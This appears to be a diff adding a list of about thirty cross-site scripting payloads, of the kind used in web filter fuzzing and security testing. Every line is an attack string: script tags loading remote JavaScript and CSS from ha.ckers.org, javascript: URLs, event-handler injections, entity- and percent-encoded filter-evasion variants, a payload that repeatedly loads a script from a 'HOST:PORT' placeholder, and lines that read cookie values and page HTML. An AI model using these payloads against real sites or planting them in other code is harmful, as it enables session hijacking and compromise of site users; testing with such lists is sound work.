@@ -1,0 +1,30 @@
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<object data=javascript:alert(1)>
+http://www.<script>alert(1)</script .com
+*/alert(1)</script><script>/*
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<body onhashchange=alert(1)><a href=#x>click this!#x
+<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<x%0Donxxx=1
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<iframe/onreadystatechange=alert(1)
+<input autofocus onblur=alert(1)>
+<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<embed src=javascript:alert(1)>
+<var onmouseover="prompt(1)">On Mouse Over</var>?
+<x onclick=alert(1)>click this!
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+<x ondrag=alert(1)>drag this!
+"><img src=x onerror=window.open('https://www.google.com/');>
+<x %6Fnxxx=1
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
+<x/onxxx=1
+<marquee onstart=alert(1)>
+<x onmousedown=alert(1)>click this!
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+\'-alert(1)//
